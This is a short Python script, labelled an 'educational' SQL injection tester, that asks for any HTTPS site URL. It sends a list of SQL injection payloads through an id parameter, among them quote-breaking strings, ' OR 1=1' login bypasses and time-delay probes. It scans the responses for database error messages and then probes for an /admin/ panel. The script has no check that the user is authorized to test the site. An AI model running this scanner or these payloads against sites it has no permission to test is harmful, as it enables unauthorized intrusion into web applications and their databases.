# STENY - Advanced SQLi Tester (Educational Purpose Only)

import requests
import time

site = input("Enter the full site URL (must start with https://): ").strip()
time.sleep(1)
confirm = input("Are you sure the site is correct? (yes or no): ").strip().lower()
time.sleep(1)

if not site.startswith("https://"):
    print("❌ Please enter the site with https://")
    exit()

if confirm != "yes":
    print("❌ Exiting...")
    exit()

print("🔍 Starting SQL Injection test. Please wait...\n")
time.sleep(1)

# Wide range of common SQLi payloads
payloads = [
    "'", '"', "`", "''", '";--', "' OR 1=1--", '" OR 1=1--',
    "' OR 'a'='a", '" OR "a"="a', "' OR 1=1#", "' OR 1=1/*",
    "' OR '1'='1' --", "') OR ('1'='1", "') OR '1'='1' --",
    "admin' --", "' OR sleep(5)--", "'; WAITFOR DELAY '00:00:05'--",
    "' OR 1=1;--", "' OR 'x'='x", "' OR 1=1 LIMIT 1--",
    "' OR EXISTS(SELECT * FROM users)--"
]

vulnerable = False

for payload in payloads:
    try:
        test_url = f"{site}?id={payload}"
        print(f"🔗 Testing: {test_url}")
        response = requests.get(test_url, timeout=7)

        if any(error in response.text.lower() for error in ["sql", "syntax", "mysql", "mssql", "pg_", "ora-", "fatal", "odbc"]):
            print(f"\n🚨 Possible SQL Injection vulnerability found!")
            print(f"URL: {test_url}\n")
            vulnerable = True
            break
    except requests.exceptions.RequestException:
        continue

# Admin Panel Detection
try:
    admin_url = site.rstrip("/") + "/admin/"
    admin_response = requests.get(admin_url, timeout=5)
    if admin_response.status_code == 200:
        print(f"🔓 Admin Panel may exist: {admin_url}")
except:
    pass

if not vulnerable:
    print("✅ No basic SQL injection vulnerability found.")